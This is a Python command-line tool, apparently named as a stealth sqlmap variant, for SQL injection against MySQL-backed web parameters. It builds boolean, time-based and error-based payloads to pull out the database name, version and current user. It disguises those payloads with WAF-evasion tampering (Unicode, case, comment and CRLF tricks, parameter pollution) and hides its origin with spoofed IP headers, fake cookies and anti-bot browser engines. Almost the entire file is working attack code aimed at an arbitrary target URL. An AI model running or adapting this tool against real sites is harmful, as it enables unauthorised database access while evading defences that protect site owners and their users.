
#!/usr/bin/env python3
# sqlmap_stealth_pro_v5_ultimate.py

import argparse
import asyncio
import requests
import random
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import unicodedata

from browser_manager import BrowserManager

# Global browser manager instance
browser_manager = BrowserManager()

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/126.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
    ]
    return random.choice(user_agents)

def generate_realistic_cookie():
    # Simulate common cookies that might be set by websites
    cookies = {
        "sessionid": "".join(random.choices("abcdef0123456789", k=32)),
        "csrftoken": "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=64)),
        "_ga": f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
        "_gid": f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}"
    }
    return "; ".join([f"{k}={v}" for k, v in cookies.items()])

def tamper_payload(payload, tamper_techniques=None):
    if tamper_techniques is None:
        tamper_techniques = ["space_to_comment", "url_encode_all", "random_case", "unicode_obfuscation", "crlf_injection", "http_parameter_pollution"]

    tampered_payload = payload
    for technique in tamper_techniques:
        if technique == "space_to_comment":
            tampered_payload = tampered_payload.replace(" ", "/**/")
        elif technique == "url_encode_all":
            tampered_payload = urlencode({tampered_payload: ""}).replace("%3D", "") # Encode everything
        elif technique == "random_case":
            tampered_payload = "".join(random.choice([c.upper(), c.lower()]) for c in tampered_payload)
        elif technique == "unicode_obfuscation":
            # Example: Replace common characters with their full-width Unicode equivalents
            # This is a simplified example, a real implementation would be more comprehensive
            replacements = {
                ' ': '　',  # Ideographic Space
                '(': '（',  # Fullwidth Left Parenthesis
                ')': '）',  # Fullwidth Right Parenthesis
                '=': '＝',  # Fullwidth Equals Sign
                '/': '／',  # Fullwidth Solidus
                '\\': '＼', # Fullwidth Reverse Solidus
                '-': '－',  # Fullwidth Hyphen-Minus
                '"': '＂', # Fullwidth Quotation Mark
                '\'': '＇', # Fullwidth Apostrophe
            }
            for old, new in replacements.items():
                tampered_payload = tampered_payload.replace(old, new)
            tampered_payload = unicodedata.normalize('NFKC', tampered_payload) # Normalize to NFKC
        elif technique == "crlf_injection":
            # Add CRLF injection to headers or parameters
            # This is a conceptual addition, actual implementation depends on context
            tampered_payload = tampered_payload.replace(" ", "%0D%0A") # Replace spaces with CRLF
        elif technique == "http_parameter_pollution":
            # Duplicate parameter to bypass WAF parsing
            # This requires modification in how parameters are sent, not just payload
            pass # Handled in fetch_content for now
        # Add more tampering techniques here
    return tampered_payload

def generate_payload(param_value, extract_what, method, pos=None, char_code=None, sleep_time=5):
    if method == "boolean":
        # Simplified boolean payload for WAF bypass
        return f"' AND {pos}={pos} -- -" if char_code == 1 else f"' AND {pos}={pos+1} -- -"
    elif method == "time_based":
        if extract_what == "database":
            return f"' AND IF(SUBSTRING(DATABASE(), {pos}, 1) = CHAR({char_code}), SLEEP({sleep_time}), 0) -- -"
        elif extract_what == "version":
            return f"' AND IF(SUBSTRING(VERSION(), {pos}, 1) = CHAR({char_code}), SLEEP({sleep_time}), 0) -- -"
        elif extract_what == "current_user":
            return f"' AND IF(SUBSTRING(CURRENT_USER(), {pos}, 1) = CHAR({char_code}), SLEEP({sleep_time}), 0) -- -"
    elif method == "error_based":
        if extract_what == "database":
            return f"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- -"
        elif extract_what == "version":
            return f"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- -"
        elif extract_what == "current_user":
            return f"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT CURRENT_USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- -"
    return param_value

async def fetch_content(url, params, headers, engine, proxy=None):
    full_url = url
    if params:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Implement HTTP Parameter Pollution (HPP)
        hpp_params = {}
        for k, v in params.items():
            if isinstance(v, list):
                hpp_params[k] = v
            else:
                hpp_params[k] = [v, v] # Duplicate parameter

        query_params.update(hpp_params)
        encoded_params = urlencode(query_params, doseq=True)
        full_url = urlunparse(parsed_url._replace(query=encoded_params))

    print(f"[+] Fetching {full_url} using {engine} engine...")

    if engine == "requests":
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {
                    "http": proxy,
                    "https": proxy
                }
            import cloudscraper
            scraper = cloudscraper.create_scraper(sess=session)
            response = scraper.get(full_url, headers=headers, timeout=10)
            return response.text, response.status_code
        except Exception as e:
            print(f"Requests fetch error: {e}")
            return "", 0
    elif engine == "playwright":
        try:
            html, status_code = await browser_manager.fetch_playwright(full_url, headers=headers, proxy=proxy)
            return html, status_code
        except Exception as e:
            print(f"Playwright fetch error: {e}")
            return "", 0
    elif engine == "selenium":
        try:
            html, status_code = browser_manager.fetch_selenium(full_url, headers=headers, proxy=proxy)
            return html, status_code
        except Exception as e:
            print(f"Selenium fetch error: {e}")
            return "", 0
    elif engine == "uc":
        try:
            html, status_code = browser_manager.fetch_uc(full_url, headers=headers, proxy=proxy)
            return html, status_code
        except Exception as e:
            print(f"Undetected-Chromedriver fetch error: {e}")
            return "", 0
    return "", 0

async def boolean_based_sqli(url, param, extract_what, engine, proxy=None, true_condition_string="Welcome", false_condition_string="Error"):
    print(f"[🚀 BOOLEAN-Based SQLi Extraction | DBMS: mysql | Extracting: {extract_what}]")

    extracted_data = ""
    # Use binary search for boolean-based SQLi to reduce requests and WAF detection
    # This simplified payload is for initial WAF bypass testing (1=1 vs 1=2)
    # A full binary search implementation would be more complex and iterative
    
    # Test for true condition
    payload_true = generate_payload("", extract_what, "boolean", 1, 1) # 1=1
    tampered_payload_true = tamper_payload(payload_true)
    headers_true = {
        "User-Agent": generate_user_agent(),
        "Cookie": generate_realistic_cookie(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8", # Added Indonesian language
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "Referer": url,
        "Content-Type": f"application/x-www-form-urlencoded; charset={random.choice(['utf-8', 'iso-8859-1', 'ibm500'])}",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Via": f"1.1 {random.randint(100,200)}.proxy.com",
        "True-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "CF-Connecting-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Forwarded-Host": urlparse(url).netloc,
        "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"'
    }
    time.sleep(random.uniform(0.5, 2.0))
    params_true = {param: tampered_payload_true}
    html_content_true, status_code_true = await fetch_content(url, params_true, headers_true, engine, proxy)

    is_true_condition = False
    if status_code_true == 200 and true_condition_string in html_content_true:
        is_true_condition = True

    # Test for false condition
    payload_false = generate_payload("", extract_what, "boolean", 1, 0) # 1=2
    tampered_payload_false = tamper_payload(payload_false)
    headers_false = {
        "User-Agent": generate_user_agent(),
        "Cookie": generate_realistic_cookie(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "Referer": url,
        "Content-Type": f"application/x-www-form-urlencoded; charset={random.choice(['utf-8', 'iso-8859-1', 'ibm500'])}",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Via": f"1.1 {random.randint(100,200)}.proxy.com",
        "True-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "CF-Connecting-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Forwarded-Host": urlparse(url).netloc,
        "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"'
    }
    time.sleep(random.uniform(0.5, 2.0))
    params_false = {param: tampered_payload_false}
    html_content_false, status_code_false = await fetch_content(url, params_false, headers_false, engine, proxy)

    is_false_condition = False
    if status_code_false == 200 and false_condition_string in html_content_false:
        is_false_condition = True

    if is_true_condition and not is_false_condition:
        print("[+] Boolean-based SQLi seems to be working (1=1 is true, 1=2 is false).")
        # Here you would implement the full binary search to extract data
        # For now, we just confirm the bypass works with simple conditions
        extracted_data = "Bypass Confirmed (further extraction needed)"
    else:
        print("[-] Boolean-based SQLi bypass failed. Either WAF still blocking or conditions not met.")
        extracted_data = "Bypass Failed"

    print(f"[+] Extracted {extract_what}: {extracted_data}")
    return extracted_data

async def time_based_sqli(url, param, extract_what, engine, proxy=None, sleep_time=5):
    print(f"[⏰ TIME-Based SQLi Extraction | DBMS: mysql | Extracting: {extract_what}]")

    extracted_data = ""
    for pos in range(1, 50):
        found_char = False
        for char_code in range(32, 127):
            current_char = chr(char_code)
            
            payload = generate_payload("", extract_what, "time_based", pos, char_code, sleep_time)
            tampered_payload = tamper_payload(payload)

            headers = {
                "User-Agent": generate_user_agent(),
                "Cookie": generate_realistic_cookie(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Referer": url,
                "Content-Type": f"application/x-www-form-urlencoded; charset={random.choice(['utf-8', 'iso-8859-1', 'ibm500'])}",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Via": f"1.1 {random.randint(100,200)}.proxy.com",
                "True-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "CF-Connecting-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Forwarded-Host": urlparse(url).netloc,
                "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
                "Sec-CH-UA-Mobile": "?0",
                "Sec-CH-UA-Platform": '"Windows"'
            }

            time.sleep(random.uniform(0.5, 2.0))

            params = {param: tampered_payload}
            start_time = time.time()
            await fetch_content(url, params, headers, engine, proxy)
            end_time = time.time()

            if (end_time - start_time) >= sleep_time:
                extracted_data += current_char
                print(f"[+] Found char '{current_char}' at position {pos}. Current data: {extracted_data}")
                found_char = True
                break
        
        if not found_char:
            print(f"[-] No character found at position {pos}. End of data or error.")
            break

    print(f"[+] Extracted {extract_what}: {extracted_data}")
    return extracted_data

async def error_based_sqli(url, param, extract_what, engine, proxy=None):
    print(f"[💥 ERROR-Based SQLi Extraction | DBMS: mysql | Extracting: {extract_what}]")

    extracted_data = ""
    # For error-based, we usually get the full string in one go (or in parts depending on payload)
    # The current payload extracts the full string. We'll just make one request.
    payload = generate_payload("", extract_what, "error_based")
    tampered_payload = tamper_payload(payload)

    headers = {
        "User-Agent": generate_user_agent(),
        "Cookie": generate_realistic_cookie(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "Referer": url,
        "Content-Type": f"application/x-www-form-urlencoded; charset={random.choice(['utf-8', 'iso-8859-1', 'ibm500'])}",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Via": f"1.1 {random.randint(100,200)}.proxy.com",
        "True-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "CF-Connecting-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Forwarded-Host": urlparse(url).netloc,
        "Sec-CH-UA": '"Not_A Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"'
            }

    time.sleep(random.uniform(0.5, 2.0))

    params = {param: tampered_payload}
    html_content, status_code = await fetch_content(url, params, headers, engine, proxy)

    # Look for the error pattern in the HTML content
    match = re.search(r"~(.+?)~", html_content)
    if match:
        extracted_data = match.group(1)
        print(f"[+] Extracted {extract_what}: {extracted_data}")
    else:
        print(f"[-] No error-based data found for {extract_what}.")

    return extracted_data

async def main():
    parser = argparse.ArgumentParser(description="Advanced SQLi tool with WAF bypass capabilities.")
    parser.add_argument("--url", required=True, help="Target URL.")
    parser.add_argument("--param", required=True, help="Vulnerable parameter.")
    parser.add_argument("--method", default="boolean", choices=["boolean", "time_based", "error_based"], help="SQLi method (boolean, time_based, error_based).")
    parser.add_argument("--extract-what", required=True, choices=["database", "version", "current_user"], help="What to extract (database, version, current_user).")
    parser.add_argument("--engine", default="requests", choices=["requests", "playwright", "selenium", "uc"], help="Engine to use for requests.")
    parser.add_argument("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080).")
    parser.add_argument("--true-string", default="Welcome", help="String indicating a TRUE condition in the response (for boolean-based). Recommended to calibrate.")
    parser.add_argument("--false-string", default="Error", help="String indicating a FALSE condition in the response (for boolean-based). Recommended to calibrate.")
    parser.add_argument("--sleep-time", type=int, default=5, help="Sleep time for time-based SQLi (in seconds).")

    args = parser.parse_args()

    if args.method == "boolean":
        await boolean_based_sqli(
            args.url,
            args.param,
            args.extract_what,
            args.engine,
            args.proxy,
            args.true_string,
            args.false_string
        )
    elif args.method == "time_based":
        await time_based_sqli(
            args.url,
            args.param,
            args.extract_what,
            args.engine,
            args.proxy,
            args.sleep_time
        )
    elif args.method == "error_based":
        await error_based_sqli(
            args.url,
            args.param,
            args.extract_what,
            args.engine,
            args.proxy
        )
    
    await browser_manager.close_all()

if __name__ == "__main__":
    asyncio.run(main())